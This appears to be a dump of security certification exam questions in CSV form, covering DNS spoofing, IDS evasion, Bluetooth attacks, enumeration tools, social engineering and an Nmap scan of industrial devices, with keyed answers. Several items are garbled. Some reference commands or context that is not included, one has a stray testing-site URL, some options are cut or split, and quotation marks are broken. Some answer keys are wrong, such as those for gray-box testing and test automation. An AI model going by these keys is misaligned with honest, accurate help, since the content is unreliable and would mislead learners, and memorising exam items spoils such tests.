"Let's imagine three companies (A, B and C), all competing in a challenging global environment. Company A and B are working together in developing a product that will generate a major competitive advantage for them. Company A has a secure DNS server while company B has a DNS server vulnerable to spoofing. With a spoofing attack on the DNS server of company B, company C gains access to outgoing e-mails from company B. How do you prevent DNS spoofing?\nA. Install DNS logger and track vulnerable packets\nB. Disable DNS timeouts\nC. Install DNS Anti-spoofing\nD. Disable DNS Zone Transfer\n","Answer: C — C. Install DNS Anti-spoofing"
"Which Intrusion Detection System is the best applicable for large environments where critical assets on the network need extra scrutiny and is ideal for observing sensitive network segments?\nA. Honeypots\nB. Firewalls\nC. Network-based intrusion detection system (NIDS)\nD. Host-based intrusion detection system (HIDS)\n","Answer: C — C. Network-based intrusion detection system (NIDS)"
"A large company intends to use Blackberry for corporate mobile phones and a security analyst is assigned to evaluate the possible threats. The analyst will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defenses and gain access to the Prometric Online Testing – Reports https://ibt1.prometric.com/users/custom/report_queue/rq_str... corporate network. What tool should the analyst use to perform a Blackjacking attack?\nA. Paros Proxy\nB. BBProxy\nC. Blooover\nD. BBCrack\n","Answer: B — B. BBProxy"
"What is the minimum number of network connections in a multihomed firewall?\nA. 3\nB. 5\nC. 4\nD. 2\n","Answer: A — A. 3"
"Which of the following is a component of a risk assessment?\nA. Administrative safeguards\nB. Physical security\nC. DMZ\nD. Logical interface\n","Answer: A — A. Administrative safeguards"
"Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be used to perform session splicing attacks?\nA. tcpsplice\nB. Burp\nC. Hydra\nD. Whisker\n","Answer: D — D. Whisker"
"Which of the following is not a Bluetooth attack?\nA. Bluedriving\nB. Bluesmacking\nC. Bluejacking\nD. Bluesnarfing\n","Answer: A — A. Bluedriving"
"What is the proper response for a NULL scan if the port is closed?\nA. SYN\nB. ACK\nC. FIN\nD. PSH\nE. RST\nF. No response\n","Answer: E — E. RST"
"You are the Network Admin, and you get a complaint that some of the websites are no longer accessible. You try to ping the servers and find them to be reachable. Then you type the IP address and then you try on the browser, and find it to be accessible. But they are not accessible when you try using the URL. What may be the problem?\nA. Traffic is Blocked on UDP Port 53\nB. Traffic is Blocked on TCP Port 80\nC. Traffic is Blocked on TCP Port 54\nD. Traffic is Blocked on UDP Port 80\n","Answer: A — A. Traffic is Blocked on UDP Port 53"
"If a token and 4-digit personal identification number (PIN) are used to access a computer system and the token performs off-line checking for the correct PIN, what type of attack is possible?\nA. Birthday\nB. Brute force\nC. Man-in-the-middle\nD. Smurf\n","Answer: B — B. Brute force"
"Peter, a Network Administrator, has come to you looking for advice on a tool that would help him perform SNMP enquires over the network. Which of these tools would do the SNMP enumeration he is looking for? Select the best answers.\nA. SNMPUtil\nB. SNScan\nC. SNMPScan\nD. Solarwinds IP Network Browser\nE. NMap\n","Answer: ABD — A. SNMPUtil; B. SNScan; D. Solarwinds IP Network Browser"
"What is a ??Collision attack?? in cryptography?\nA. Collision attacks try to get the public key\nB. Collision attacks try to break the hash into three parts to get the plaintext value\nC. Collision attacks try to break the hash into two parts, with the same bytes in each part to get the private key\nD. Collision attacks try to find two inputs producing the same hash\n","Answer: D — D. Collision attacks try to find two inputs producing the same hash"
"PGP, SSL, and IKE are all examples of which type of cryptography?\nA. Digest\nB. Secret Key\nC. Public Key\nD. Hash Algorithm\n","Answer: C — C. Public Key"
"MX record priority increases as the number increases. (True/False.)\nA. True\nB. False\n","Answer: B — B. False"
"A company??s policy requires employees to perform file transfers using protocols which encrypt traffic. You suspect some employees are still performing file transfers using unencrypted protocols because the employees do not like changes. You have positioned a network sniffer to capture traffic from the laptops used by employees in the data ingest department. Using Wireshark to examine the captured traffic, which command can be used as display filter to find unencrypted file transfers?\nA. tcp.port = = 21\nB. tcp.port = 23\nC. tcp.port = = 21 | | tcp.port = =22\nD. tcp.port ! = 21\n","Answer: A — A. tcp.port = = 21"
"s) What is the known plaintext attack used against DES which gives the result that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key?\nA. Man-in-the-middle attack\nB. Meet-in-the-middle attack\nC. Replay attack\nD. Traffic analysis attack\n","Answer: B — B. Meet-in-the-middle attack"
"Which of the following represents the initial two commands that an IRC client sends to join an IRC network?\nA. USER, NICK\nB. LOGIN, NICK\nC. USER, PASS\nD. LOGIN, USER\n","Answer: A — A. USER, NICK"
"The establishment of a TCP connection involves a negotiation called three-way handshake. What type of message does the client send to the server in order to begin this negotiation?\nA. ACK\nB. SYN\nC. RST\nD. SYN-ACK\n","Answer: B — B. SYN"
"You just set up a security system in your network. In what kind of system would you find the following string of characters used as a rule within its configuration? alert tcp any any -> 192.168.100.0/24 21 (msg: ????FTP on the network!????;)\nA. A firewall IPTable\nB. FTP Server rule\nC. A Router IPTable\nD. An Intrusion Detection System\n","Answer: D — D. An Intrusion Detection System"
"Which of the following tools are used for enumeration? (Choose three.)\nA. SolarWinds\nB. USER2SID\nC. Cheops\nD. SID2USER\nE. DumpSec\n","Answer: BDE — B. USER2SID; D. SID2USER; E. DumpSec"
"s) What is Eve trying to do?\nA. Eve is trying to connect as a user with Administrator privileges\nB. Eve is trying to enumerate all users with Administrative privileges\nC. Eve is trying to carry out a password crack for user Administrator\nD. Eve is trying to escalate privilege of the null user to that of Administrator\n","Answer: C — C. Eve is trying to carry out a password crack for user Administrator"
"You are tasked to perform a penetration test. While you are performing information gathering, you find an employee list in Google. You find the receptionist??s email, and you send her an email changing the source email to her boss??s email (boss@company). In this email, you ask for a pdf with information. She reads your email and sends back a pdf with links. You exchange the pdf links with your malicious links (these links contain malware) and send back the modified pdf, saying that the links don??t work. She reads your email, opens the links, and her machine gets infected. You now have access to the company network. What testing method did you use?\nA. Social engineering\nB. Piggybacking\nC. Tailgating\nD. Eavesdropping\n","Answer: A — A. Social engineering"
"Which of the following statements about a zone transfer is correct? (Choose three.)\nA. A zone transfer is accomplished with the DNS\nB. A zone transfer is accomplished with the nslookup service\nC. A zone transfer passes all zone information that a DNS server maintains\nD. A zone transfer passes all zone information that a nslookup server maintains\nE. A zone transfer can be prevented by blocking all inbound TCP port 53 connections\nF. Zone transfers cannot occur on the Internet\n","Answer: ACE — A. A zone transfer is accomplished with the DNS; C. A zone transfer passes all zone information that a DNS server maintains; E. A zone transfer can be prevented by blocking all inbound TCP port 53 connections"
"As a securing consultant, what are some of the things you would recommend to a company to ensure DNS security?\nA. Use the same machines for DNS and other applications\nB. Harden DNS servers\nC. Use split-horizon operation for DNS servers\nD. Restrict Zone transfers\nE. Have subnet diversity between DNS servers\n","Answer: BCDE — B. Harden DNS servers; C. Use split-horizon operation for DNS servers; D. Restrict Zone transfers; E. Have subnet diversity between DNS servers"
"A hacker is an intelligent individual with excellent computer skills and the ability to explore a computer??s software and hardware without the owner??s permission. Their intention can either be to simply gain knowledge or to illegally make changes. Which of the following class of hacker refers to an individual who works both offensively and defensively at various times?\nA. White Hat\nB. Suicide Hacker\nC. Gray Hat\nD. Black Hat\n","Answer: C — C. Gray Hat"
"Which of the following incident handling process phases is responsible for defining rules, collaborating human workforce, creating a back-up plan, and testing the plans for an organization?\nA. Preparation phase\nB. Containment phase\nC. Identification phase\nD. Recovery phase\n","Answer: A — A. Preparation phase"
"Which of the following tools is used to detect wireless LANs using the 802.11a/b/g/n WLAN standards on a linux platform?\nA. Kismet\nB. Abel\nC. Netstumbler\nD. Nessus\n","Answer: A — A. Kismet"
"The configuration allows a wired or wireless network interface controller to pass all traffic it receives to the Central Processing Unit (CPU), rather than passing only the frames that the controller is intended to receive. Which of the following is being described?\nA. Multi-cast mode\nB. Promiscuous mode\nC. WEM\nD. Port forwarding\n","Answer: B — B. Promiscuous mode"
"Which of the following is a low-tech way of gaining unauthorized access to systems?\nA. Social Engineering\nB. Eavesdropping\nC. Scanning\nD. Sniffing\n","Answer: A — A. Social Engineering"
"What is correct about digital signatures?\nA. A digital signature cannot be moved from one signed document to another because it is the hash of the original document encrypted with the private key of the signing party.\nB. Digital signatures may be used in different documents of the same type.\nC. A digital signature cannot be moved from one signed document to another because it is a plain hash of the document content.\nD. Digital signatures are issued once for each user and can be used everywhere until they expire.\n","Answer: A — A. A digital signature cannot be moved from one signed document to another because it is the hash of the original document encrypted with the private key of the signing party."
"What is a NULL scan?\nA. A scan in which all flags are turned off\nB. A scan in which certain flags are off\nC. A scan in which all flags are on\nD. A scan in which the packet size is set to zero\nE. A scan with an illegal packet size\n","Answer: A — A. A scan in which all flags are turned off"
"A large mobile telephony and data network operator has a data center that houses network elements. These are essentially large computers running on Linux. The perimeter of the data center is secured with firewalls and IPS systems. What is the best security policy concerning this setup?\nA. Network elements must be hardened with user ids and strong password\nB. Regular security tests and audits should be performed.\nC. As long as the physical access to the network elements is restricted, there is no need for additional measures.\nD. There is no need for specific security measures on the network elements as long as firewalls and IPS systems exist.\nE. The operator knows that attacks and down time are inevitable and should have a backup site.\n","Answer: A — A. Network elements must be hardened with user ids and strong password"
"Which of the following describes the characteristics of a Boot Sector Virus?\nA. Modifies directory table entries so that directory entries point to the virus code instead of the actual program.\nB. Moves the MBR to another location on the RAM and copies itself to the original location of the MBR.\nC. Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR.\nD. Overwrites the original MBR and only executes the new virus code.\n","Answer: C — C. Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR."
"The ??Gray-box testing?? methodology enforces what kind of restriction?\nA. Only the external operation of a system is accessible to the tester.\nB. The internal operation of a system in only partly accessible to the tester.\nC. Only the internal operation of a system is known to the tester.\nD. The internal operation of a system is completely known to the tester.\n","Answer: D — D. The internal operation of a system is completely known to the tester."
"The company ABC recently contracts a new accountant. The accountant will be working with the financial statements. Those financial statements need to be approved by the CFO and then they will be sent to the accountant but the CFO is worried because he wants to be sure that the information sent to the accountant was not modified once he approved it. Which of the following options can be useful to ensure the integrity of the data?\nA. The CFO can use a hash algorithm in the document once he approved the financial statements\nB. The CFO can use an excel file with a password\nC. The financial statements can be sent twice, one by email and the other delivered in USB and the accountant can compare both to be sure is the same document\nD. The document can be sent to the accountant using an exclusive USB for that document\n","Answer: A — A. The CFO can use a hash algorithm in the document once he approved the financial statements"
"Scenario1: * 1. Victim opens the attacker's web site. * 2. Attacker sets up a web site which contains interesting and attractive content like 'Do you want to make $1000 in a day?'. * 3. Victim clicks to the interesting and attractive content URL. * 4. Attacker creates a transparent 'iframe' in front of the URL which victim attempts to click, so victim thinks that he/she clicks to the 'Do you want to make $1000 in a day?' URL but actually he/she clicks to the content or URL that exists in the transparent 'iframe' which is setup by the attacker. What is the name of the attack which is mentioned in the scenario?\nA. Session Fixation\nB. HTML Injection\nC. HTTP Parameter Pollution\nD. Clickjacking Attack\n","Answer: D — D. Clickjacking Attack"
"Which type of security feature stops vehicles from crashing through the doors of a building?\nA. Bollards\nB. Receptionist\nC. Mantrap\nD. Turnstile\n","Answer: A — A. Bollards"
"When you are getting information about a web server, it is very important to know the HTTP Methods (GET, POST, HEAD, PUT, DELETE, TRACE) that are available because there are two critical methods (PUT and DELETE). PUT can upload a file to the server and DELETE can delete a file from the server. You can detect all these methods (GET, POST, HEAD, DELETE, PUT, TRACE) using NMAP script engine. What Nmap script will help you with this task?\nA. http-methods\nB. http enum\nC. http-headers\nD. http-git\n","Answer: A — A. http-methods"
"By using a smart card and pin, you are using a two-factor authentication that satisfies\nA. Something you are and something you remember\nB. Something you have and something you know\nC. Something you know and something you are\nD. Something you have and something you are\n","Answer: B — B. Something you have and something you know"
"What did the following commands determine?\nA. That the Joe account has a SID of 500\nB. These commands demonstrate that the guest account has NOT been disabled\nC. These commands demonstrate that the guest account has been disabled\nD. That the true administrator is Joe\nE. Issued alone, these commands prove nothing\n","Answer: D — D. That the true administrator is Joe"
"Null sessions are un-authenticated connections (not using a username or password.) to an NT or 2000 system. Which TCP and UDP ports must you filter to check null sessions on your network?\nA. 137 and 139\nB. 137 and 443\nC. 139 and 443\nD. 139 and 445\n","Answer: D — D. 139 and 445"
"Which of the following Linux commands will resolve a domain name into IP address?\nA. >host-t a hackeddomain.com\nB. >host-t ns hackeddomain.com\nC. >host -t soa hackeddomain.com\nD. >host -t AXFR hackeddomain.com\n","Answer: A — A. >host-t a hackeddomain.com"
"What is the role of test automation in security testing?\nA. It is an option but it tends to be very expensive.\nB. It should be used exclusivel\nC. Manual testing is outdated because of low speed and possible test setup inconsistencies.\nD. Test automation is not usable in security due to the complexity of the tests.\nE. It can accelerate benchmark tests and repeat them with a consistent test setu\nF. But it cannot replace manual testing completely.\n","Answer: D — D. Test automation is not usable in security due to the complexity of the tests."
"An Intrusion Detection System (IDS) has alerted the network administrator to a possibly malicious sequence of packets sent to a Web server in the network??s external DMZ. The packet traffic was captured by the IDS and saved to a PCAP file. What type of network tool can be used to determine if these packets are genuinely malicious or simply a false positive?\nA. Protocol analyzer\nB. Network sniffer\nC. Intrusion Prevention System (IPS)\nD. Vulnerability scanner\n","Answer: A — A. Protocol analyzer"
"You are a penetration tester working to test the user awareness of the employees of the client xyz. You harvested two employees' emails from some public sources and are creating a client-side backdoor to send it to the employees via email. Which stage of the cyber kill chain are you at?\nA. Reconnaissance\nB. Command and control\nC. Weaponization\nD. Exploitation\n","Answer: C — C. Weaponization"
"Jim, a professional hacker, targeted an organization that is operating critical Industrial Infrastructure. Jim used Nmap to scan open pons and running services on systems connected to the organization's OT network. He used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered Information such as the vendor name, product code and name, device name, and IP address. Which of the following Nmap commands helped Jim retrieve the required information?\nA. nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >\nB. nmap -Pn -sU -p 44818 --script enip-info < Target IP >\nC. nmap -Pn -sT -p 46824 < Target IP >\nD. nmap -Pn -sT -p 102 --script s7-info < Target IP >\n","Answer: B — B. nmap -Pn -sU -p 44818 --script enip-info < Target IP >"
"Steve, an attacker, created a fake profile on a social media website and sent a request to Stella. Stella was enthralled by Steve's profile picture and the description given for his profile, and she initiated a conversation with him soon after accepting the request. After a few days. Sieve started asking about her company details and eventually gathered all the essential information regarding her company. What is the social engineering technique Steve employed in the above scenario?\nA. Diversion theft\nB. Baiting\nC. Honey trap\nD. Piggybacking\n","Answer: C — C. Honey trap"
"How is the public key distributed in an orderly, controlled fashion so that the users can be sure of the sender??s identity?\nA. Hash value\nB. Private key\nC. Digital signature\nD. Digital certificate\n","Answer: D — D. Digital certificate"
